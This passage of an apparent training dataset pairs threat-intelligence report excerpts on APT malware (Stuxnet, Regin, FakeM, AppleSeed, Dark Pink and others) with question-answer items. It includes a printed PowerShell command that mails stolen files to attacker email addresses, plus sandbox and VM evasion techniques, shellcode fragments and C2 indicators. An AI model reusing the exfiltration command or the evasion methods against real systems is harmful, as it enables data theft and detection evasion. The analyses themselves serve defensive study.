and Kiribati are unusual, because we rarely see such advanced malware in such remote, tiny countries. In particular, the victim in Kiribati is most unusual. To put this into context, Kiribati is a small island in the Pacific with a population around 100,000. According to experts, Kiribati is probably going to become one of the first victims of global warming, as it will be under water by 2050. ()\nBig Headline: Attribution\nConsidering the complexity and cost of Regin's development, it is likely that this operation is supported by a nation state. While attribution remains a very difficult problem when it comes to professional attackers such as the ones behind Regin, certain metadata extracted from the samples is still worth a look.\nWe have collected timestamps from samples, which are normally put automatically by the development software:\nAs this information could be easily altered by the developers, it is up to the reader to attempt to interpret this: as an intentional false flag, or a non-critical indicator left by the developers.\nMore information about Regin is available to Kaspersky Intelligent Services' clients. Contact:\nQ: Describe the Command and Control (C&C) mechanism employed by the Regin malware. What makes this mechanism sophisticated and how does it operate within the victim networks?",
    "output": "The Command and Control (C&C) mechanism employed by the Regin malware is highly sophisticated and relies on communication drones deployed throughout the victim networks. These drones use various protocols such as HTTP, Windows network pipes, ICMP, SMB (named pipes), and HTTPS to communicate within the network. The purpose of this complex infrastructure is to achieve deep access into the network, potentially bypassing air gaps, and to minimize traffic to the external C&C servers. Machines on the network border act as routers, connecting internal victims with external C&Cs. In one notable case, a peer-to-peer network was formed among victims in a Middle Eastern country, including the president's office, a research center, an educational institution, and a bank. This setup ensures that malicious traffic is less suspicious, as it appears to originate from known local entities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Nicolas Falliere, Liam O Murchu, and Eric Chien\nContents\nWhile the bulk of the analysis is complete, Stuxnet is an incredibly large and complex threat. The authors expect to make revisions to this document shortly after release as new information is uncovered or may be publicly disclosed. This paper is the work of numerous individuals on the Syman-tec Security Response team over the last three months well beyond the cited authors. Without their assistance, this paper would not be possible.\nBig Headline: Executive Summary\nStuxnet is a threat targeting a specific industrial control system likely in Iran, such as a gas pipeline or power plant. The ultimate goal of Stuxnet is to sabotage that facility by reprogramming programmable logic controllers (PLCs) to operate as the attackers intend them to, most likely out of their specified boundaries.\nStuxnet was discovered in July, but is confirmed to have existed at least one year prior and likely even before. The majority of infections were found in Iran. Stuxnet contains many features such as:\n\u2022 Self-replicates through removable drives exploiting a vulnerability allowing auto-execution. (<http://www.securityfocus.com/bid/41732>)Microsoft Windows Shortcut 'LNK/PIF' Files Automatic File Execution Vulnerability (BID 41732)\n\u2022 Spreads in a LAN through a vulnerability in the Windows Print Spooler.\n\u2022 Spreads through SMB by exploiting the (<http://www.securityfocus.com/bid/31874>)Microsoft Windows Server Service RPC Handling Remote Code Execu-(<http://www.securityfocus.com/bid/31874>)tion Vulnerability (BID 31874).\n\u2022 Copies and executes itself on remote computers through network shares.\n\u2022 Copies and executes itself on remote computers running a WinCC database server.\n\u2022 Copies itself into Step 7 projects in such a way that it automatically executes when the Step 7 project is loaded.\n\u2022 Updates itself through a peer-to-peer mechanism within a LAN.\n\u2022 Exploits a total of four unpatched Microsoft vulnerabilities, two of which are previously mentioned vulnerabilities for self-replication and the other two are escalation of privilege vulnerabilities that have yet to be disclosed.\n\u2022 Contacts a command and control server that allows the hacker to download and execute code, including updated versions.\n\u2022 Contains a Windows rootkit that hide its binaries.\n\u2022 Attempts to bypass security products.\n\u2022 Fingerprints a specific industrial control system and modifies code on the Siemens PLCs to potentially sabotage the system.\n\u2022 Hides modified code on PLCs, essentially a rootkit for PLCs.\nBig Headline: Attack Scenario\nThe following is a possible attack scenario. It is only speculation driven by the technical features of Stuxnet.\nIndustrial control systems (ICS) are operated by a specialized assembly like code on programmable logic controllers (PLCs). The PLCs are often programmed from Windows computers not connected to the Internet or even the internal network. In addition, the industrial control systems themselves are also unlikely to be connected to the Internet.\nFirst, the attackers needed to conduct reconnaissance. As each PLC is configured in a unique manner, the attackers would first need the ICS's schematics. These design documents may have been stolen by an insider or even retrieved by an early version of Stuxnet or other malicious binary. Once attackers had the design documents and potential knowledge of the computing environment in the facility, they would develop the latest version of Stux-net. Each feature of Stuxnet was implemented for a specific reason and for the final goal of potentially sabotaging the ICS.\nAttackers would need to setup a mirrored environment that would include the necessary ICS hardware, such as PLCs, modules, and peripherals in order to test their code. The full cycle may have taken six months and five to ten core developers not counting numerous other individuals, such as quality assurance and management.\nIn addition their malicious binaries contained driver files that needed to be digitally signed to avoid suspicion. The attackers compromised two digital certificates to achieve this task. The attackers would have needed to obtain the digital certificates from someone who may have physically entered the premises of the two companies and stole them, as the two companies are in close physical proximity.\nTo infect their target, Stuxnet would need to be introduced into the target environment. This may have occurred by infecting a willing or unknowing third party, such as a contractor who perhaps had access to the facility, or an insider. The original infection may have been introduced by removable drive.\nOnce Stuxnet had infected a computer within the organization it began to spread in search of Field PGs, which are typical Windows computers but used to program PLCs. Since most of these computers are non-networked, Stuxnet would first try to spread to other computers on the LAN through a zero-day vulnerability, a two year old vulnerability, infecting Step 7 projects, and through removable drives. Propagation through a LAN likely served as the first step and propagation through removable drives as a means to cover the last and final hop to a Field PG that is never connected to an untrusted network.\nWhile attackers could control Stuxnet with a command and control server, as mentioned previously the key computer was unlikely to have outbound Internet access. Thus, all the functionality required to sabotage a system was embedded directly in the Stuxnet executable. Updates to this executable would be propagated throughout the facility through a peer-to-peer method established by Stuxnet.\nWhen Stuxnet finally found a suitable computer, one that ran Step 7, it would then modify the code on the PLC. These modifications likely sabotaged the system, which was likely considered a high value target due to the large resources invested in the creation of Stuxnet.\nVictims attempting to verify the issue would not see any rogue PLC code as Stuxnet hides its modifications.\nWhile their choice of using self-replication methods may have been necessary to ensure they'd find a suitable Field PG, they also caused noticeable collateral damage by infecting machines outside the target organization. The attackers may have considered the collateral damage a necessity in order to effectively reach the intended target. Also, the attackers likely completed their initial attack by the time they were discovered.\n\nAnswer this question based on the above context: What steps did the attackers behind Stuxnet take to ensure their malicious code would go undetected once it reached the Programmable Logic Controllers (PLCs)?",
    "output": "The attackers behind Stuxnet took several measures to ensure their malicious code remained undetected. First, they designed Stuxnet to hide its modifications on the PLCs, effectively creating a rootkit for PLCs. Additionally, Stuxnet contains a Windows rootkit that hides its binaries on the infected systems. Furthermore, the malware attempts to bypass security products, making it difficult for traditional antivirus software to detect its presence. These combined efforts aim to conceal the malicious activities and prevent victims from identifying the rogue PLC code.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Malware Overview\nFirst discussed in January 2013 in a Trend Micro , FakeM is a Trojan that uses separate modules to perform its functionality. FakeM's functional code is shellcode\u00adbased and requires another Trojan to load it into memory and execute it. There are a variety of different Trojans used to load FakeM, some of which are more interesting than others. In this section, we will explore the loader Trojans followed by an analysis of the evolution of FakeM itself. We end this section with a discussion on tools related to FakeM and used by Scarlet Mimic.\nLoader Trojans\nFakeM is shellcode\u00adbased and therefore requires another Trojan to load FakeM into memory and execute its functional code. Threat actors have developed many different loading Trojans to load FakeM, some of which are fairly straightforward while others use very clever techniques to avoid detection. Unit 42 tracks the following list of loader Trojans that Scarlet Mimic has used to execute FakeM:\nCrypticConvo\nSkiBoot\nRaidBase\nFakeHighFive\nPiggyBack\nFullThrottle\nFakeFish\nBrutishCommand\nSubtractThis\nIt appears that the threat actors include the loader Trojans in some sort of builder application that allows actors to quickly create, configure and deploy payloads to execute FakeM. We believe this because many samples that execute FakeM have the same exact compilation time but different C2 servers, as seen in the example in Table 1. This suggests the actors compile a single sample and use a builder tool to configure individual samples on demand.\nWe used the loader Trojans to provide a general timeline for the development of FakeM samples, as FakeM is shellcode\u00adbased and does not contain any usable timestamps. The timestamps in the loader Trojans does not necessarily correspond to the usage of FakeM, but plotting the compile times of the loaders on a timeline shows an interesting trend. The scatter plot timeline in Figure 7 shows the known compilation times of the loader Trojans and the FakeM variant that it executed.\nBased on the timeline, it appears that the actors were actively developing several of the loaders at the same time from 2009 until the early months of 2014. After the first quarter of 2014, it appears that the actors abandoned development of the older loaders in favor of FakeFish, BrutishCommand and SubtractThis. This does not mean that actors will not continue to use the older loaders, but it does suggest that the actors will continue including the newer or freshly developed loaders in updated builder applications.\nThe timeline also presents the possibility that the FakeM developers reacted to the release of Trend Micro's FakeM and . Trend Micro published their analysis of the FakeM Trojan on January 17, 2013 (marked in Figure 7 by a red line) that discussed the original variant of FakeM. Shortly after, the original variant of FakeM drops off the timeline in favor of the SSL and Custom SSL variants. It is possible that the FakeM developers saw their tool was exposed and adapted it to avoid detection for continued use as a payload in attacks. We cannot be certain if the developers reacted\nspecifically to Trend Micro's content, as it is possible that they were reacting to the increased antivirus detection rate of their tool that resulted from the exposure of the tool. Regardless of the specific stimulus, the reaction shows that the FakeM threat actors evolved to avoid detection/attribution and to continue their attack campaigns.\nThe timeline does have one noticeable outlier, specifically the FakeHighFive sample compiled in September 2009 that loaded a FakeM SSL sample. We believe this compile time is incorrect, as the C2 domain for this sample, specifically press.ufoneconference[.]com, was registered by the threat actor in February 2013. The registration of the C2 domain in February 2013 aligns with other compilation times of FakeM SSL, which leads us to the conclusion that the September 2009 compilation timestamp was modified and/or inaccurate.\nMost of the related loader Trojans, such as CrypticConvo, PiggyBack, FullThrottle, FakeHighFive, FakeFish and RaidBase do little more than load encrypted FakeM shellcode (either from a PE resource or embedded data), decrypt it, and execute the resulting shellcode. Other related loading Trojans, such as SubtractThis, BrutishCommand and SkiBoot employ clever techniques worth discussing.\nSubtractThis\nThe SubtractThis loader displays a technique that is quite clever. This loader received its name based on a technique it uses to delay before carrying out its main functionality, specifically by requiring the user to hit the minus (\"\u00ad\") key. SubtractThis carries out this technique through the following steps:\n1. Calls LoadAcceleratorsA function to load the virtual key for the minus character \"\u00ad\". Example: LoadAcceleratorsA(hInstance, VK_SUBTRACT);\n2. Calls SetTimer function to set up a callback function that will be called in the event that the LB_FINDSTRING Windows message. Example: SetTimer(0, LB_FINDSTRING_, 10000u, TimerFunc);\n3. Creates a continuous loop that starts by calling GetMessageA to obtain Windows messages\n4. Calls TranslateAcceleratorA to check Windows message received is VK_SUBTRACT \"\u00ad\".\n5. Calls the callback function set up in the SetTimer function if the user enters the minus \"\u00ad\" key.\nThis technique requires user interaction, which makes analysis in sandboxes more difficult.\nBrutishCommand\nThe BrutishCommand loader uses a very interesting method to decrypt the FakeM functional code. The main function in this loader checks the command line arguments passed to it, and if there are none present it will obtain a random number between 0\u00ad9 and create a new process using the same executable with this random number as a command line argument.\nIf the executable has a command line argument, the Trojan subjects the value to a hashing algorithm and compares the hash to 0x20E3EEBA. If the value matches the static hash, the executable will\nsubject the command line argument to a second algorithm that will produce a value that the Trojan will use as the decryption key to decrypt the embedded FakeM shellcode. It essentially brute forces its own decryption key by rerunning itself over and over until it runs with the correct value is provided on the command line. Unit 42 had not seen this technique used by other malware families and it introduces a challenging hurdle when attempting to analyze or debug the loader Trojan.\nSkiBoot Loader\nSkiBoot reads the master boot record (MBR) of the system to determine the XOR key that it will use to decrypt the FakeM shellcode. It carries out this functionality by calling the ReadFile function to read 512\u00adbytes from \"\\\\.\\PHYSICALDRIVE0\" and specifically uses the last byte of the MBR as the encryption key. The last byte of the MBR is \"\\xAA\", or the second byte of \"\\x55\\xAA\", which is the boot signature portion of the MBR.\nInstead of using ReadFile, one variant of this loader reads the MBR using DeviceIOControl using the ID_CMD control code, and accesses a specific offset to obtain the value that it will rotate each byte in the ciphertext within the decryption algorithm. The significance of using DeviceIOControl is that the VMware hypervisor responds to this API call with a blank buffer instead of the MBR, whereas the Virtualbox hypervisor returns the MBR correctly. It appears that this loader is specifically using the DeviceIOControl API function as a VMware detection technique, suggesting that the developers are well versed in the nuances of the VMware hypervisor and virtual machine evasion.\n\nBased on the above text, answer a question. How does the SkiBoot loader Trojan used by Scarlet Mimic utilize the Master Boot Record (MBR) for its operations, and what implications does this have for cybersecurity defenses?",
    "output": "SkiBoot reads the Master Boot Record (MBR) of the system to determine the XOR key that it will use to decrypt the FakeM shellcode. It does this by reading 512 bytes from '\\\\.\\PHYSICALDRIVE0' and using the last byte of the MBR, which is '\\xAA'. One variant of this loader uses DeviceIOControl with the ID_CMD control code to read the MBR, which acts as a VMware detection technique since VMware hypervisors respond differently to this API call. This technique has implications for cybersecurity defenses because it demonstrates the threat actors' advanced knowledge of system internals and virtual machine evasion tactics, necessitating more sophisticated detection and analysis methods.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 3.1.4. Thread\nAppleSeed executes thPingCmd which works as the main thread. The thread simply executes two threads in the span of 60 seconds. The first thread is named sendHttpPing, which periodically communicates with the C&C server to maintain connection. The second thread is named dropAndRunCmd and performs malicious behaviors by receiving commands from the server.\nThe following table shows the URLs used by AppleSeed to communicate with the C&C server.\n\"m\" seems to mean \"mode,\" with \"a\" being used for \"ping\", \"b\" for \"commands\", \"c\" for \"downloading commands\", and \"d\" for \"completing downloading commands\". These are all the URLs used in the sample,\nbut more types of URLs are used for the sample with the info-stealing feature enabled, and they will be discussed later when the sample is analyzed.\nSmall Headline: a. sendHttpPing Thread\nThe sendHttpPing thread is excuted every 60 seconds, sending the basic information of the infected system to the C&C server. Unlike other communication instances where only the PcID is sent, this thread also sends PcInfo and the malware version like the URL shown below.\nThe PcID used in this case combines the volume serial number and the user name such as \"888a15a5testUser.\" PcInfo is a bit more complicated. It is a string that appears to show the Windows version (Major, Minor, and Build) as well as the architecture and the malware version. The malware version is the string \"D_Regsvr32\" that was obtained during the decoding process for previous settings data and the string that was decoded in the current thread 2.0 and 7.\nThe information is ultimately sent to the C&C server with the following URL:\nSmall Headline: b. dropAndRunCmd Thread\nThis thread performs commands that it has received. After requesting the C&C server to send commands, it downloads and decrypts them to perform malicious behaviors, then sends back the result.\nIt accesses the C&C server using the URL \"/?m=c&p1=[PcID]\" and downloads the data that includes commands. The User-Agent string used in the process is as follows:\nThe downloaded data is saved as a file in the %ALLUSERSPROFILE%\\temp\\ path. Unlike average malware strains, AppleSeed saves features that can be processed within the memory as a file. So for every stage, such as downloading commands and unpacking and decrypting files, all the results are saved in the %ALLUSERSPROFILE%\\temp\\ path.\nWhen the download is finished, the malware accesses the C&C server via the URL \"/?m=d&p1=[PcID]\" to inform the server that the process has been completed. It is currently not possible to access the server, but it appears that the downloaded data starts with the \"%PDF-1.7..4 0 obj\" signature. AppleSeed begins the unpacking process after scanning the signature.\nThe decryption process follows when the unpacking process is complete. The unpacked data includes the RC4 key encrypted with the RSA public key and the data encrypted with the RC4 key. The malware first decrypts the data saved in the 0x80 size after +0x04 using the RSA (1024) private key included in the binary and obtains the RC4 key based on the data. Then it decrypts the data with the RC4 key to have the command data.\nWhile the command data is not available for download at this moment, it appears that the unpacked data will have the following format based on the uploading process that will be discussed later in this report.\nThe following table is a list of commands that the current analysis target, AppleSeed, can perform. The command names are based on the string confirmed through the debug message.\nUnlike the MemDLL command that loads and executes malware within the memory, DLL and UpdateDLL command download DLL in the file form and execute it with the \"regsvr32.exe /s\" command. They are divided into two commands (DLL, UpdateDLL) which are essentially the same.\nAs for the CMD command, it executes the command line that was sent and receives the result through a pipe to save it in the %ALLUSERSPROFILE%\\temp\\ path. It then additionally encrypts the saved file before sending it like zip compression or the encryption process discussed above. The command first creates a random RC4 key and encrypts the zip compression file with the RC4 algorithm. The randomly created RC4 key is encrypted with the public key included in the binary. The final data after the encoding process is as follows:\nThe compressed and encrypted data is attached to the POST request and sent as the following URL:\nMedium Headline: 3.2. Analysis of Info-stealing Feature\nWhile the sample discussed earlier is a simple malware without the info-stealing feature, the same cannot be said for other AppleSeed samples. Those with functional info-stealing feature can receive additional commands from the C&C server and perform them. The following table provides an overview on the info-stealing feature and routines for performing additional commands.\nAppleSeed samples with functional info-stealing feature use more URLs than those mentioned above.\nThe following shows the entire URLs used with an explanation for each case.\nSmall Headline: 3.2.1. Information Theft\nStarting from the installation, the sample proves that it's different by creating the flags folder and flag files before copying and running the file in the installation path. Each flag file contains a Unicode string \"flag.\" At the info-stealing routine, the sample checks each flag and steals information from each existing flag. The stolen data is then sent to the C&C server after being encrypted and compressed with zip.\nSmall Headline: a. Setting Target Files to be Stolen\nBesides 4 monitor threads, AppleSeed has an additional thread that was not mentioned earlier. It periodically reads the \"list.fdb\" file that exists in the installation path, and if the file contains the pathname of a certain file, it compresses and encrypts the file in the path to send it to the C&C server. The d command writes the received pathname into the \"list.fdb\" file, and if the attacker wishes to steal a certain file, they can send the file path through the d command to upload it to their server.\nThe URL used to upload files from the thread is the same as the one that is used to steal document files and USB drive file list as shown below.\nSmall Headline: c. Downloading Files\nA command for downloading files to create the received data in a certain path.\n3.3. C&C Communication Using Emails\nIn terms of overall features, AppleSeed samples that use email for C&C communications are not much different from the sample discussed in the \"3.1 Analysis of Default Features\" in this report. However, one difference is that the samples use email protocols instead of HTTP during the C&C communications process. As such, the C&C communications via emails will be analyzed in detail.\nLike the sample with default features from the \"3.1.4. Thread\" part, AppleSeed utilizing email creates 2 main threads. They can be categorized as Ping thread and Command thread respectively, using email protocol to communicate with the C&C server. The email address and password of the attacker are encoded and saved within the file.\nThe attacker used the curl open source 2 to communicate with the C&C server using an email. The 2 main threads created by the Email AppleSeed sample can be divided into a thread that uses the IMAP protocol and a thread that uses the SMTP protocol based on their roles. The Ping thread defined in the \"3.1. \"Analysis of Default Features\" part uses the SMTP protocol as its role is to send the information of the current system to the attacker's email. The Command thread uses the IMAP protocol since it receives additional malicious data from the attacker's email.\n2\nSmall Headline: 3.3.2. Command Thread (IMAP)\nThis thread is executed every 30 seconds. It checks if there is an email mailbox named \"cmd\" in the attacker's email account and downloads additional malware through the email's attachments. As the attacker's email account cannot currently be accessed, it is not certain what types of malicious files exist. \"5. Post Infection\" section of this report will discuss additionally installed malware strains identified by AhnLab ASD infrastructure.\nThe attacker uses the IMAP feature of the curl open source to download additional malware from the email server. After going through the IMAP reset process, the thread sends the \"select cmd\" command to check if the mailbox named \"cmd\" exists.\nIf the mailbox named \"cmd\" exists, the thread saves the attached file in the %ALLUSERSPROFILE%\\temp path with the name [random 4 characters].tmp after going through the parsing process.\nAfter saving the attached file in the %ALLUSERSPROFILE%\\temp path, the sample uses the \"STORE 1 +Flags \\Deleted\" command to delete the email with the attached file from the mailbox. The process for unpacking and decrypting the file is the same as the content of the dropAndRunCmd thread explained in \"3.1 Analysis of Default Features.\" This means that the sample can perform 4 commands: CMD, DLL, MemDLL, and UpdateDLL.\n\nHow does AppleSeed handle the theft of specific files from an infected system, and what mechanisms does it use to upload these files to the C&C server?",
    "output": "A: AppleSeed has an additional thread that periodically reads a 'list.fdb' file located in the installation path. If this file contains the pathname of a specific file, the malware compresses and encrypts that file and sends it to the C&C server. The 'd' command is used to write the received pathname into the 'list.fdb' file, allowing the attacker to specify which files to steal. The stolen files are uploaded using the same URL that is used to steal document files and USB drive file lists. This mechanism allows the attacker to exfiltrate sensitive data from the infected system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the attackers behind the FinFisher APT use Masquerading: Right-to-Left Override to disguise the true nature of the malicious attachments in their spearphishing campaign?",
    "output": "Masquerading: Right-to-Left Override is a technique used by adversaries to disguise a string and/or file name to make it appear benign. In the case of the FinFisher APT, the attackers used this technique to disguise the true nature of the malicious attachments in their spearphishing campaign. Specifically, they used the RLO character (U+202E) to control the positioning of characters in text containing characters flowing from right to left, such as Arabic or Hebrew. By doing so, they made the malware appear as a harmless '.jpg' file, when in reality it was an executable '.exe' file. For example, the file 'exe.Rajab1.jpg' would be displayed as 'gpj.1bajaR.exe' when the UTF-8 based filename is displayed in ANSI. This allowed the attackers to trick victims into running the malware, thinking they were opening a harmless image file.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Exploitation\n\u2022 Preparing the heap\n\u2022 Arbitrary memory access\nThe SWF file calls back to Javascript in IE to trigger the IE bug and overwrite the length field of a Flash vector object in the heapspray. The SWF file loops through the heapspray to find the corrupted vector object, and uses it to again modify the length of another vector object. This other corrupted vector object is then used for subsequent memory accesses, which it then uses to bypass ASLR and DEP.\n\u2022 Runtime ROP generation\nWith full memory control, the exploit will search for ZwProtectVirtualMemory, and a stack pivot (opcode 0\u00d794 0xc3) from NTDLL. It also searches for SetThreadContext in kernel32, which is used to clear the debug registers. This technique, documented (<http://piotrbania.com/all/articles/anti_emet_eaf.txt>)here, may be an attempt to bypass protections that use hardware breakpoints, such as EMET's EAF mitigation.\nWith the addresses of the aforementioned APIs and gadget, the SWF file constructs a ROP chain, and prepends it to its RC4 decrypted shellcode. It then replaces the vftable of a sound object with a fake one that points to the newly created ROP payload. When the sound object attempts to call into its vftable, it instead pivots control to the attacker's ROP chain.\n\u2022 ROP and Shellcode\nThe ROP payload basically tries to make memory at 0\u00d718184000 executable, and to return to 0x1818411c to execute the shellcode.\nInside the shellcode, it saves the current stack pointer to 0\u00d718181800 to safely return to the caller.\nmov   dword ptr ds:[18181800h],ebp\nThen, it restores the flash.Media.Sound vftable and repairs the corrupted vector object to avoid application crashes.\n18184129 90  nop\n1818412a c700c0f22169  mov   dword ptr [eax],offset\nFlash32_11_7_700_261!AdobeCPGetAPI+0x42ac00 (6921f2c0)\n18184133 b800401818\nmov\neax,18184000h\n18184138 90\nnop\n18184139 90\nnop\n1818413a c700fe030000  mov   dword ptr [eax],3FEh ds:0023:18184000=3ffffff0\nThe shellcode also recovers the ESP register to make sure the stack range is in the current thread stack base/limit.\nThe shellcode calls SetThreadContext to clear the debug registers. It is possible that this is an attempt to bypass mitigations that use the debug registers.\nThe shellcode calls URLDownloadToCacheFileA to download the next stage of the payload, disguised as an image.\nBig Headline: Threat Group History\nThe APT group responsible for this exploit has been the first group to have access to a select number of browser-based 0-day exploits (e.g. IE, Firefox, and Flash) in the past. They are extremely proficient at lateral movement and are difficult to track, as they typically do not reuse command and control infrastructure. They have a number of backdoors including one known as Pirpi that we previously discussed (<http://www.fireeye.com/blog/technical/botnet-activities-research/2010/11/ie-0-day-hupigon-joins-the-party.html>)here. CVE-2010-3962, then a 0-day exploit in Internet Explorer 6, 7, and 8 dropped the Pirpi payload discussed in this previous case.\nAs this is still an active investigation we are not releasing further indicators about the exploit at this time.\nAcknowledgement: We thank Christopher Glyer, Matt Fowler, Josh Homan, Ned Moran, Nart Villeneuve and Yichong Lin for their support, research, and analysis on these findings.\n\nAnswer this question based on the above context: What techniques does the shellcode used in Operation Clandestine Fox employ to ensure stability and evade detection? Explain the significance of each technique.",
    "output": "The shellcode employed in Operation Clandestine Fox uses several techniques to ensure stability and evade detection. First, it saves the current stack pointer to a specific memory address (0x18181800) to safely return to the caller. This ensures that the execution flow can be properly restored after the shellcode completes its tasks. Next, it restores the flash.Media.Sound vftable and repairs the corrupted vector object to avoid application crashes, maintaining the stability of the exploited environment. Additionally, the shellcode recovers the ESP register to ensure the stack range is within the current thread stack base/limit, preventing potential stack overflow issues. It also calls SetThreadContext to clear the debug registers, which may be an attempt to bypass mitigations that use the debug registers for detection. Finally, the shellcode uses URLDownloadToCacheFileA to download the next stage of the payload disguised as an image, making it harder for traditional detection mechanisms to identify the malicious activity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Data exfiltration\nAs is the case with many other attacks of this kind, the threat actors exfiltrate data through ZIP archives. During Dark Pink attacks, all data (list of files from common network shares, web browser data, documents, etc.) that is to be sent to the threat actors is stacked in the $env:tmp\\backuplog folder. However, the collection and sending process operate separately from one another. When the infected machine is issued a command to download the $env:tmp\\backuplog folder, the list of files will be copied to $env:tmp\\backuplog1 folder, added to archive and sent to the threat actors' Telegram bot. After this step is completed, the $env:tmp\\backuplog1 directory is deleted.\nDark Pink threat actors can also leverage their self-made stealers Cucky and Ctealer to draw data from infected machines. The functionalities of both of these stealers are the same. They can be used to extract data such as passwords, history, logins, and cookies from web browsers. The stealers themselves do not require any internet connection, as they save the result of the execution (stolen data) to files. Both of the stealers can be downloaded from the threat actors' Github account automatically by commands issued by the malware. An example of the script used to launch Cucky is shown in APPENDIX C.\nIn total, Group-IB researchers discovered that Dark Pink exfiltrated files via three separate pathways. The first of these pathways sees the threat actors use Telegram to receive files. As a device is infected, information is collected in a specific folder by the malware and sent via Telegram by a special command. By extension, the files that are sent to the threat actors are: .doc, .docx, xls,.xlsx,.ppt,.pptx,.pdf. An example of a script that carries out this process can be found in APPENDIX D.\nIn addition to Telegram, Group-IB found evidence that the threat actors exfiltrated files via Dropbox. This method is slightly different to the one used to exfiltrate via Telegram, as it involves a series of PowerShell scripts that transfer files from a specific folder to a Dropbox account by performing a HTTP request with a hardcoded token.\nOne particular attack discovered by Group-IB was of particular surprise to us. Despite the device being controlled by commands issued by a threat actor-controlled Telegram channel via Telegram bots, some interesting files were sent via email. An example of this command is shown below.\n$filepath=\"$env:tmp/backuplog\";\n$cred = New-Object System.Management.Automation.PSCredential\n(\"lanhuong.jsc@outlook.com\",(ConvertTo-SecureString \"CHANGED\" -AsPlainText -Force)); Send-MailMessage -To \"blackpink.301@outlook[.]com\" -From \"blackred.113@outlook[.]com\"\n-Subject \"$env:computername\" -UseSsl -Credential $cred\n-Attachments (gci $filepath).fullname\nThe list of emails used during data exfiltration are shown below:\nblackpink.301@outlook[.]com alibaba.113@outlook[.]com alibaba.113@outlook[.]com.vn blackred.113@outlook[.]com lanhuong.jsc@outlook[.]com nphuongmai.97@outlook[.]com\nAt this stage, Group-IB researchers believe that the exfiltration method of choice depends on the potential restrictions set out in the victim's network infrastructure.\n\nQuestion: How does the Dark Pink APT group handle data exfiltration, and what are the key steps involved in their process?\n\nAnswer:",
    "output": "The Dark Pink APT group handles data exfiltration through several steps and pathways. First, all data to be exfiltrated, such as lists of files from common network shares, web browser data, and documents, is collected and stored in the $env:tmp\\\\backuplog folder. When the infected machine receives a command to download this folder, the data is copied to the $env:tmp\\\\backuplog1 folder, archived, and sent to the threat actors' Telegram bot. After this step, the $env:tmp\\\\backuplog1 directory is deleted. Additionally, Dark Pink uses self-made stealers like Cucky and Ctealer to extract sensitive information such as passwords, history, logins, and cookies from web browsers. These stealers save the stolen data to files without requiring an internet connection. The threat actors can also exfiltrate files via Telegram, Dropbox, and email. For Telegram, the malware collects information in a specific folder and sends it via a special command. For Dropbox, PowerShell scripts transfer files to a Dropbox account using a hardcoded token. In one instance, files were sent via email using a script that specifies the recipient, sender, subject, and attachments.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Background on KASPERAGENT\nKASPERAGENT is Microsoft Windows malware used in efforts targeting users in the United States, Israel, Palestinian Territories, and Egypt since July 2015. The malware was discovered by Palo Alto Networks Unit 42 and (<https://researchcenter.paloaltonetworks.com/2017/04/unit42-targeted-attacks-middle-east-using-kasperagent-micropsia/>)ClearSky Cyber Security, and publicized in April 2017 in the Targeted Attacks in the Middle East Using KASPERAGENT and MICROPSIA blog. It is called KASPERAGENT based on PDB strings identified in the malware such as \"c:\\Users\\USA\\Documents\\Visual Studio 2008\\Projects\\New folder (2)\\kasper\\Release\\kasper.pdb.\"\nThe threat actors used shortened URLs in spear phishing messages and fake news websites to direct targets to download KASPERAGENT. Upon execution, KASPERAGENT drops the payload and a decoy document that displays Arabic names and ID numbers. The malware establishes persistence and sends HTTP requests to the command and control domain mailsinfo[.]net. Of note, the callbacks were to PHP scripts that included /dad5/ in the URLs. Most samples of the malware reportedly function as a basic reconnaissance tool and downloader. However, some of the recently identified files display \"extended-capability\" including the functionality to steal passwords, take screenshots, log keystrokes, and steal files. These \"extended-capability\" samples called out to an additional command and control domain, stikerscloud[.]com. Additionally, early variants of KASPERAGENT used \"Chrome\" as the user agent, while more recent samples use \"OPAERA\" - a possible misspelling of the \"Opera\" - browser. The indicators associated with the blog article are available in the ThreatConnect Technical Blogs and Reports source (<https://app.threatconnect.com/auth/incident/incident.xhtml?incident=4003314>)here.\nThe samples we identified leverage the same user agent string \"(<https://app.threatconnect.com/auth/indicators/details/customIndicator.xhtml?id=29927402&owner=Common+Community>)OPAERA\", included the kasper PDB string reported by Unit 42, and used similar POST and GET requests. The command and control domains were different, and these samples used unique decoy documents to target their victims.\n\nQuestion: How did the threat actors behind KASPERAGENT leverage spear phishing and fake news websites to distribute the malware, and what specific techniques did they employ to establish persistence and communicate with command and control servers?\n\nAnswer:",
    "output": "The threat actors behind KASPERAGENT utilized shortened URLs in spear phishing messages and fake news websites to direct targets to download the malware. Upon execution, KASPERAGENT drops a payload and a decoy document displaying Arabic names and ID numbers. The malware establishes persistence on the infected system and sends HTTP requests to the command and control domain mailsinfo[.]net. Notably, the callbacks were directed to PHP scripts that included '/dad5/' in the URLs. Some samples of the malware demonstrated extended capabilities such as stealing passwords, taking screenshots, logging keystrokes, and stealing files. These advanced samples communicated with an additional command and control domain, stikerscloud[.]com. Early variants of KASPERAGENT used 'Chrome' as the user agent, while more recent samples used 'OPAERA', likely a misspelling of the 'Opera' browser.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nGrabit and the RATs\nNot so long ago, Kaspersky clients in the United States approached Kaspersky researchers with a request to investigate a new type of malicious software that they were able to recover from their organizations' servers. The malware calls itself Grabit and is distinctive because of its versatile behavior. Every sample we found was different in size and activity from the others but the internal name and other identifiers were disturbingly similar. The timestamp seems valid and close to the documented infection timeline. Our documentation points to a campaign that started somewhere in late February 2015 and ended in mid-March. As the development phase supposedly ended, malware started spreading from India, the United States and Israel to other countries around the globe.\nAll of the dozens of samples we managed to collect were programmed in Windows machine 32bit processor, over the Microsoft .NET Framework (Visual Basic/C#). Files were compiled over the course of three days, between March 7th and 9th of 2015. The following chart illustrates how the group or individual created the samples, the size of each sample, the time of the day when each was compiled and the time lapses between each compilation.\n\nWhy did Kaspersky researchers conclude that the Grabit malware campaign was distinctive and what were the key indicators that pointed to its versatility?",
